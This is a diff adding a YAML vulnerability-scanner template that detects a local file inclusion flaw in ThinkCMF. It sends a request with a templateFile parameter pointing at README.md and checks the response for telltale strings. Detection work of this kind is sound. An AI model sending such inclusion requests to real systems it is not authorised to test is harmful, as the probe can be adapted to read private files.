@@ -1,0 +1,22 @@
+id: thinkcmf-lfi
+info:
+  name: ThinkCMF Local File Inclusion (LFI) Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: lfi
+  description: |
+    Detects ThinkCMF Local File Inclusion vulnerability by attempting to include a local README.md file.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?a=display&templateFile=README.md"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ThinkCMF"
+          - "## README"
